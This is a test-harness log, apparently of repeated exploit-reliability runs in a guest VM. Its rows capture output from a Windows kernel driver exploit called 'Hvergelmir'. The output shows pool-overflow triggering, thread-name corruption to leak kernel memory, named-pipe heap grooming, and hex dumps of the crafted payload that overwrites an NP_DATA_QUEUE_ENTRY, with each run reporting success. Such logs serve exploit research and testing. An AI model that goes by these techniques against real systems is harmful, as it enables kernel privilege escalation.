 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",Guest-side one minute timeout
2026-06-09T06:37:38+00:00,2,9,1,running,running,True,success,0,5.828,True,True,21,11.0,1,21,21,1,"SB attempt 20 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 21 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 20 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=4 NpFr=104 pipeBase=100 pipeIndex=12 capture=0 iosbAttempt=20 pipeAttempt=0 pipeLeak=0
    [000001FFAA00D160]  42536F490A100000  2B6FDF6260D598ED
    [000001FFAA00D170]  D4903CE5B802885D  0000000000000000
    [000001FFAA00D180]  0000000000000000  0000000000000000
    [000001FFAA00D190]  42536F490E0D0003  0000000000000000
    [000001FFAA00D1A0]  000000000000000C  FFFF970D6F465200
    [000001FFAA00D1B0]  00000000000003E8  6161616161616161
    [000001FFAA00D1C0]  6161616161616161  6161616161616161
    [000001FFAA00D1D0]  6161616161616161  6161616161616161
    [000001FFAA00D1E0]  6161616161616161  6161616161616161
    [000001FFAA00D1F0]  6161616161616161  6161616161616161
    [000001FFAA00D200]  6161616161616161  6161616161616161
    [000001FFAA00D210]  6161616161616161  6161616161616161
    [000001FFAA00D220]  6161616161616161  6161616161616161
    [000001FFAA00D230]  6161616161616161  6161616161616161
    [000001FFAA00D240]  6161616161616161  6161616161616161
    [000001FFAA00D250]  0000000000000000  0000000000000000
    [000001FFAA00D260]  7246704E0A100000  2B6FDF6260D599ED
    [000001FFAA00D270]  FFFF970D6FEE0388  FFFF970D6FEE0388
    [000001FFAA00D280]  0000000000000000  FFFF970D6E5F3A80
    [000001FFAA00D290]  000000C000000000  00000000000000C0
    [000001FFAA00D2A0]  0000000C45504950  3939393939393939
    [000001FFAA00D2B0]  3939393939393939  3939393939393939
    [000001FFAA00D2C0]  3939393939393939  3939393939393939
    [000001FFAA00D2D0]  3939393939393939  3939393939393939
    [000001FFAA00D2E0]  3939393939393939  3939393939393939
    [000001FFAA00D2F0]  3939393939393939  3939393939393939
    [000001FFAA00D300]  3939393939393939  3939393939393939
    [000001FFAA00D310]  3939393939393939  3939393939393939
    [000001FFAA00D320]  3939393939393939  3939393939393939
    [000001FFAA00D330]  3939393939393939  3939393939393939
    [000001FFAA00D340]  3939393939393939  3939393939393939
    [000001FFAA00D350]  3939393939393939  3939393939393939
    [000001FFAA00D360]  7246704E0A100000  2B6FDF6260D59AED
    [000001FFAA00D370]  FFFF970D6FEE68C8  FFFF970D6FEE68C8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001FFAA00D3D0]  7246704E0A100000  2B6FDF6260D599ED
    [000001FFAA00D3E0]  FFFF970D6FEE0388  FFFF970D6FEE0388
    [000001FFAA00D3F0]  000001FFA9AD0890  FFFF970D6E5F3A80
    [000001FFAA00D400]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001FFAA00D3C0]  0000000000000000  0000000000000000
    [000001FFAA00D3D0]  7246704E0A100000  2B6FDF6260D599ED
    [000001FFAA00D3E0]  FFFF970D6FEE0388  FFFF970D6FEE0388
    [000001FFAA00D3F0]  000001FFA9AD0890  FFFF970D6E5F3A80
    [000001FFAA00D400]  000000C000000001  00000000000000C0
    [000001FFAA00D410]  0000000C45504950  3939393939393939
    [000001FFAA00D420]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=2
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:37:46+00:00,2,10,2,running,running,True,success,0,6.594,True,True,1,1.0,1,1,1,1,"ergelmir Exploit
 [+] Connected to driver successfully!

 [*] Pipe layout attempt 1/24

 [*] #### Corrupting ThreadName to Leak Data (VOLATILE) ####
 [*] Priming overflow with chunk size: 0x100
 [*] Triggering overflow with payload size: 0xbc (Padding: 0x98, Overflow: 0x24)
 [*] Sending 0xbc bytes of payload to driver...
       Retrying Pool Layout
 [*] Priming overflow with chunk size: 0x100
 [*] Triggering overflow with payload size: 0xbc (Padding: 0x98, Overflow: 0x24)
 [*] Sending 0xbc bytes of payload to driver...
 [*] ###### Found ThreadName Overwrite ######
 [*] Cleaned 2999 extra thread names, 0 failed
 [*] IoSB attempt 1 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 0 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=404 NpFr=504 pipeBase=500 pipeIndex=15 capture=0 iosbAttempt=0 pipeAttempt=0 pipeLeak=0
    [00000203A839C820]  42536F490A100000  2B6FDF62649C5EED
    [00000203A839C830]  D4903CE5B865EE5D  0000000000000000
    [00000203A839C840]  0000000000000000  0000000000000000
    [00000203A839C850]  42536F490E0D0003  0000000000000000
    [00000203A839C860]  000000000000000C  FFFF970D6EC71020
    [00000203A839C870]  00000000000003E8  6161616161616161
    [00000203A839C880]  6161616161616161  6161616161616161
    [00000203A839C890]  6161616161616161  6161616161616161
    [00000203A839C8A0]  6161616161616161  6161616161616161
    [00000203A839C8B0]  6161616161616161  6161616161616161
    [00000203A839C8C0]  6161616161616161  6161616161616161
    [00000203A839C8D0]  6161616161616161  6161616161616161
    [00000203A839C8E0]  6161616161616161  6161616161616161
    [00000203A839C8F0]  6161616161616161  6161616161616161
    [00000203A839C900]  6161616161616161  6161616161616161
    [00000203A839C910]  0000000000000000  0000000000000000
    [00000203A839C920]  7246704E0A100000  2B6FDF62649C5FED
    [00000203A839C930]  FFFF970D6FEE1648  FFFF970D6FEE1648
    [00000203A839C940]  0000000000000000  FFFF970D6E5F2BE0
    [00000203A839C950]  000000C000000000  00000000000000C0
    [00000203A839C960]  0000000F45504950  3939393939393939
    [00000203A839C970]  3939393939393939  3939393939393939
    [00000203A839C980]  3939393939393939  3939393939393939
    [00000203A839C990]  3939393939393939  3939393939393939
    [00000203A839C9A0]  3939393939393939  3939393939393939
    [00000203A839C9B0]  3939393939393939  3939393939393939
    [00000203A839C9C0]  3939393939393939  3939393939393939
    [00000203A839C9D0]  3939393939393939  3939393939393939
    [00000203A839C9E0]  3939393939393939  3939393939393939
    [00000203A839C9F0]  3939393939393939  3939393939393939
    [00000203A839CA00]  3939393939393939  3939393939393939
    [00000203A839CA10]  3939393939393939  3939393939393939
    [00000203A839CA20]  7246704E0A100000  2B6FDF62649C50ED
    [00000203A839CA30]  FFFF970D6FEE66E8  FFFF970D6FEE66E8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [00000203A87EC880]  7246704E0A100000  2B6FDF62649C5FED
    [00000203A87EC890]  FFFF970D6FEE1648  FFFF970D6FEE1648
    [00000203A87EC8A0]  00000203A835FE30  FFFF970D6E5F2BE0
    [00000203A87EC8B0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [00000203A87EC870]  0000000000000000  0000000000000000
    [00000203A87EC880]  7246704E0A100000  2B6FDF62649C5FED
    [00000203A87EC890]  FFFF970D6FEE1648  FFFF970D6FEE1648
    [00000203A87EC8A0]  00000203A835FE30  FFFF970D6E5F2BE0
    [00000203A87EC8B0]  000000C000000001  00000000000000C0
    [00000203A87EC8C0]  0000000F45504950  3939393939393939
    [00000203A87EC8D0]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=4
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:37:51+00:00,2,11,3,running,running,True,success,0,3.453,True,True,1,1.0,1,1,1,1," [*] Starting Hvergelmir Exploit
 [+] Connected to driver successfully!

 [*] Pipe layout attempt 1/24

 [*] #### Corrupting ThreadName to Leak Data (VOLATILE) ####
 [*] Priming overflow with chunk size: 0x100
 [*] Triggering overflow with payload size: 0xbc (Padding: 0x98, Overflow: 0x24)
 [*] Sending 0xbc bytes of payload to driver...
 [*] ###### Found ThreadName Overwrite ######
 [*] Cleaned 2999 extra thread names, 0 failed
 [*] IoSB attempt 1 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 0 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=104 NpFr=204 pipeBase=200 pipeIndex=6 capture=0 iosbAttempt=0 pipeAttempt=0 pipeLeak=0
    [000001C163670820]  42536F490A100000  2B6FDF6264C138ED
    [000001C163670830]  D4903CE5B9EE285D  0000000000000000
    [000001C163670840]  0000000000000000  0000000000000000
    [000001C163670850]  42536F490E0D0003  0000000000000000
    [000001C163670860]  000000000000000C  FFFF970D6FC40640
    [000001C163670870]  00000000000003E8  6161616161616161
    [000001C163670880]  6161616161616161  6161616161616161
    [000001C163670890]  6161616161616161  6161616161616161
    [000001C1636708A0]  6161616161616161  6161616161616161
    [000001C1636708B0]  6161616161616161  6161616161616161
    [000001C1636708C0]  6161616161616161  6161616161616161
    [000001C1636708D0]  6161616161616161  6161616161616161
    [000001C1636708E0]  6161616161616161  6161616161616161
    [000001C1636708F0]  6161616161616161  6161616161616161
    [000001C163670900]  6161616161616161  6161616161616161
    [000001C163670910]  0000000000000000  0000000000000000
    [000001C163670920]  7246704E0A100000  2B6FDF6264C139ED
    [000001C163670930]  FFFF970D6FEDE3A8  FFFF970D6FEDE3A8
    [000001C163670940]  0000000000000000  FFFF970D6E5E3100
    [000001C163670950]  000000C000000000  00000000000000C0
    [000001C163670960]  0000000645504950  3939393939393939
    [000001C163670970]  3939393939393939  3939393939393939
    [000001C163670980]  3939393939393939  3939393939393939
    [000001C163670990]  3939393939393939  3939393939393939
    [000001C1636709A0]  3939393939393939  3939393939393939
    [000001C1636709B0]  3939393939393939  3939393939393939
    [000001C1636709C0]  3939393939393939  3939393939393939
    [000001C1636709D0]  3939393939393939  3939393939393939
    [000001C1636709E0]  3939393939393939  3939393939393939
    [000001C1636709F0]  3939393939393939  3939393939393939
    [000001C163670A00]  3939393939393939  3939393939393939
    [000001C163670A10]  3939393939393939  3939393939393939
    [000001C163670A20]  7246704E0A100000  2B6FDF6264C13AED
    [000001C163670A30]  FFFF970D6FEE3BC8  FFFF970D6FEE3BC8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001C16366EF60]  7246704E0A100000  2B6FDF6264C139ED
    [000001C16366EF70]  FFFF970D6FEDE3A8  FFFF970D6FEDE3A8
    [000001C16366EF80]  000001C163120FC0  FFFF970D6E5E3100
    [000001C16366EF90]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001C16366EF50]  0000000000000000  0000000000000000
    [000001C16366EF60]  7246704E0A100000  2B6FDF6264C139ED
    [000001C16366EF70]  FFFF970D6FEDE3A8  FFFF970D6FEDE3A8
    [000001C16366EF80]  000001C163120FC0  FFFF970D6E5E3100
    [000001C16366EF90]  000000C000000001  00000000000000C0
    [000001C16366EFA0]  0000000645504950  3939393939393939
    [000001C16366EFB0]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=2
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:37:56+00:00,2,12,4,running,running,True,success,0,3.516,True,True,2,1.5,1,2,2,1,"IoSB attempt 1 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 2 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 1 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=604 NpFr=704 pipeBase=700 pipeIndex=11 capture=0 iosbAttempt=1 pipeAttempt=0 pipeLeak=0
    [00000271DF666630]  42536F490A100000  2B6FDF62647940ED
    [00000271DF666640]  D4903CE5B88C005D  0000000000000000
    [00000271DF666650]  0000000000000000  0000000000000000
    [00000271DF666660]  42536F490E0D0003  0000000000000000
    [00000271DF666670]  000000000000000C  FFFF970D6FC41A50
    [00000271DF666680]  00000000000003E8  6161616161616161
    [00000271DF666690]  6161616161616161  6161616161616161
    [00000271DF6666A0]  6161616161616161  6161616161616161
    [00000271DF6666B0]  6161616161616161  6161616161616161
    [00000271DF6666C0]  6161616161616161  6161616161616161
    [00000271DF6666D0]  6161616161616161  6161616161616161
    [00000271DF6666E0]  6161616161616161  6161616161616161
    [00000271DF6666F0]  6161616161616161  6161616161616161
    [00000271DF666700]  6161616161616161  6161616161616161
    [00000271DF666710]  6161616161616161  6161616161616161
    [00000271DF666720]  0000000000000000  0000000000000000
    [00000271DF666730]  7246704E0A100000  2B6FDF62647941ED
    [00000271DF666740]  FFFF970D6FEDCD28  FFFF970D6FEDCD28
    [00000271DF666750]  0000000000000000  FFFF970D6E5DEB40
    [00000271DF666760]  000000C000000000  00000000000000C0
    [00000271DF666770]  0000000B45504950  3939393939393939
    [00000271DF666780]  3939393939393939  3939393939393939
    [00000271DF666790]  3939393939393939  3939393939393939
    [00000271DF6667A0]  3939393939393939  3939393939393939
    [00000271DF6667B0]  3939393939393939  3939393939393939
    [00000271DF6667C0]  3939393939393939  3939393939393939
    [00000271DF6667D0]  3939393939393939  3939393939393939
    [00000271DF6667E0]  3939393939393939  3939393939393939
    [00000271DF6667F0]  3939393939393939  3939393939393939
    [00000271DF666800]  3939393939393939  3939393939393939
    [00000271DF666810]  3939393939393939  3939393939393939
    [00000271DF666820]  3939393939393939  3939393939393939
    [00000271DF666830]  7246704E0A100000  2B6FDF62647942ED
    [00000271DF666840]  FFFF970D6FEE2CC8  FFFF970D6FEE2CC8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [00000271DF6668A0]  7246704E0A100000  2B6FDF62647941ED
    [00000271DF6668B0]  FFFF970D6FEDCD28  FFFF970D6FEDCD28
    [00000271DF6668C0]  00000271DEFCFF00  FFFF970D6E5DEB40
    [00000271DF6668D0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [00000271DF666890]  0000000000000000  0000000000000000
    [00000271DF6668A0]  7246704E0A100000  2B6FDF62647941ED
    [00000271DF6668B0]  FFFF970D6FEDCD28  FFFF970D6FEDCD28
    [00000271DF6668C0]  00000271DEFCFF00  FFFF970D6E5DEB40
    [00000271DF6668D0]  000000C000000001  00000000000000C0
    [00000271DF6668E0]  0000000B45504950  3939393939393939
    [00000271DF6668F0]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=2
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:38:00+00:00,2,13,5,running,running,True,success,0,3.094,True,True,8,4.5,1,8,8,1," IoSB attempt 7 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 8 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 7 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=504 NpFr=604 pipeBase=600 pipeIndex=2 capture=0 iosbAttempt=7 pipeAttempt=0 pipeLeak=0
    [000002C2B78F2550]  42536F490A100000  2B6FDF6265F63FED
    [000002C2B78F2560]  D4903CE5B8CE1F5D  0000000000000000
    [000002C2B78F2570]  0000000000000000  0000000000000000
    [000002C2B78F2580]  42536F490E0D0003  0000000000000000
    [000002C2B78F2590]  000000000000000C  FFFF970D70B02330
    [000002C2B78F25A0]  00000000000003E8  6161616161616161
    [000002C2B78F25B0]  6161616161616161  6161616161616161
    [000002C2B78F25C0]  6161616161616161  6161616161616161
    [000002C2B78F25D0]  6161616161616161  6161616161616161
    [000002C2B78F25E0]  6161616161616161  6161616161616161
    [000002C2B78F25F0]  6161616161616161  6161616161616161
    [000002C2B78F2600]  6161616161616161  6161616161616161
    [000002C2B78F2610]  6161616161616161  6161616161616161
    [000002C2B78F2620]  6161616161616161  6161616161616161
    [000002C2B78F2630]  6161616161616161  6161616161616161
    [000002C2B78F2640]  0000000000000000  0000000000000000
    [000002C2B78F2650]  7246704E0A100000  2B6FDF6265F630ED
    [000002C2B78F2660]  FFFF970D6FEE1828  FFFF970D6FEE1828
    [000002C2B78F2670]  0000000000000000  FFFF970D6E5EB9E0
    [000002C2B78F2680]  000000C000000000  00000000000000C0
    [000002C2B78F2690]  0000000245504950  3939393939393939
    [000002C2B78F26A0]  3939393939393939  3939393939393939
    [000002C2B78F26B0]  3939393939393939  3939393939393939
    [000002C2B78F26C0]  3939393939393939  3939393939393939
    [000002C2B78F26D0]  3939393939393939  3939393939393939
    [000002C2B78F26E0]  3939393939393939  3939393939393939
    [000002C2B78F26F0]  3939393939393939  3939393939393939
    [000002C2B78F2700]  3939393939393939  3939393939393939
    [000002C2B78F2710]  3939393939393939  3939393939393939
    [000002C2B78F2720]  3939393939393939  3939393939393939
    [000002C2B78F2730]  3939393939393939  3939393939393939
    [000002C2B78F2740]  3939393939393939  3939393939393939
    [000002C2B78F2750]  7246704E0A100000  2B6FDF6265F631ED
    [000002C2B78F2760]  FFFF970D6FEE6AA8  FFFF970D6FEE6AA8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000002C2B78F27C0]  7246704E0A100000  2B6FDF6265F630ED
    [000002C2B78F27D0]  FFFF970D6FEE1828  FFFF970D6FEE1828
    [000002C2B78F27E0]  000002C2B741FD20  FFFF970D6E5EB9E0
    [000002C2B78F27F0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000002C2B78F27B0]  0000000000000000  0000000000000000
    [000002C2B78F27C0]  7246704E0A100000  2B6FDF6265F630ED
    [000002C2B78F27D0]  FFFF970D6FEE1828  FFFF970D6FEE1828
    [000002C2B78F27E0]  000002C2B741FD20  FFFF970D6E5EB9E0
    [000002C2B78F27F0]  000000C000000001  00000000000000C0
    [000002C2B78F2800]  0000000245504950  3939393939393939
    [000002C2B78F2810]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=2
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:38:18+00:00,2,14,6,running,running,True,success,0,16.031,True,True,9,5.0,1,9,9,1,"oSB attempt 8 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 9 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 8 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 8 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=204 NpFr=304 pipeBase=300 pipeIndex=13 capture=0 iosbAttempt=8 pipeAttempt=0 pipeLeak=0
    [00000216EC8DA040]  42536F490A100000  2B6FDF626AB95DED
    [00000216EC8DA050]  D4903CE5B6327D5D  0000000000000000
    [00000216EC8DA060]  0000000000000000  0000000000000000
    [00000216EC8DA070]  42536F490E0D0003  0000000000000000
    [00000216EC8DA080]  000000000000000C  FFFF970D70B102B0
    [00000216EC8DA090]  00000000000003E8  6161616161616161
    [00000216EC8DA0A0]  6161616161616161  6161616161616161
    [00000216EC8DA0B0]  6161616161616161  6161616161616161
    [00000216EC8DA0C0]  6161616161616161  6161616161616161
    [00000216EC8DA0D0]  6161616161616161  6161616161616161
    [00000216EC8DA0E0]  6161616161616161  6161616161616161
    [00000216EC8DA0F0]  6161616161616161  6161616161616161
    [00000216EC8DA100]  6161616161616161  6161616161616161
    [00000216EC8DA110]  6161616161616161  6161616161616161
    [00000216EC8DA120]  6161616161616161  6161616161616161
    [00000216EC8DA130]  0000000000000000  0000000000000000
    [00000216EC8DA140]  7246704E0A100000  2B6FDF626AB95EED
    [00000216EC8DA150]  FFFF970D6FEBF2C8  FFFF970D6FEBF2C8
    [00000216EC8DA160]  0000000000000000  FFFF970D6E5ED8A0
    [00000216EC8DA170]  000000C000000000  00000000000000C0
    [00000216EC8DA180]  0000000D45504950  3939393939393939
    [00000216EC8DA190]  3939393939393939  3939393939393939
    [00000216EC8DA1A0]  3939393939393939  3939393939393939
    [00000216EC8DA1B0]  3939393939393939  3939393939393939
    [00000216EC8DA1C0]  3939393939393939  3939393939393939
    [00000216EC8DA1D0]  3939393939393939  3939393939393939
    [00000216EC8DA1E0]  3939393939393939  3939393939393939
    [00000216EC8DA1F0]  3939393939393939  3939393939393939
    [00000216EC8DA200]  3939393939393939  3939393939393939
    [00000216EC8DA210]  3939393939393939  3939393939393939
    [00000216EC8DA220]  3939393939393939  3939393939393939
    [00000216EC8DA230]  3939393939393939  3939393939393939
    [00000216EC8DA240]  7246704E0A100000  2B6FDF626AB95FED
    [00000216EC8DA250]  FFFF970D6FEC1668  FFFF970D6FEC1668
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [00000216ECDAD3D0]  7246704E0A100000  2B6FDF626AB95EED
    [00000216ECDAD3E0]  FFFF970D6FEBF2C8  FFFF970D6FEBF2C8
    [00000216ECDAD3F0]  00000216EC8CFB40  FFFF970D6E5ED8A0
    [00000216ECDAD400]  000000C000000001  
 [*] Full payload to trigger overflow:
    [00000216ECDAD3C0]  0000000000000000  0000000000000000
    [00000216ECDAD3D0]  7246704E0A100000  2B6FDF626AB95EED
    [00000216ECDAD3E0]  FFFF970D6FEBF2C8  FFFF970D6FEBF2C8
    [00000216ECDAD3F0]  00000216EC8CFB40  FFFF970D6E5ED8A0
